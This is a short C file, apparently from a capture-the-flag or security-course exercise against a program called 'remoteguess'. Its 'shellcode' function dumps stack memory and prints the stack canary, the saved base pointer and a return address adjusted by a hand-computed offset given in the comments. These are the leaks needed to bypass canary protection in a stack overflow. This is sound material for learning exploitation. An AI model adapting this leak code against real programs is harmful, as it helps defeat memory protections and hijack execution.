#include <alloca.h>

// shellcode return address in remoteguess: 0xa2ff
// guess return address in remoteguess: 0xa3aa
// offset: 0xa3aa - 0xa2ff = 0xab

typedef int (*printf_ptr_t)(const char *format, ...);

void shellcode(printf_ptr_t printf) {
  const unsigned long signature = 0xdeadbeef;
  unsigned long *stack_ptr = alloca(0);
  printf("Stack Bottom (Higher address)\n");
  for (int i = 10; i >= 0; i--) {
    printf("%p : %p\n", stack_ptr + i, *(stack_ptr + i));
  }
  printf("Stack Top (Lower address)\n");
  printf("canary         : %p\n", *(&signature + 2));
  printf("rbp            : %p\n", *(&signature + 3));
  printf("guess ret_addr : %p\n", *(&signature + 4) + 0xab);
}
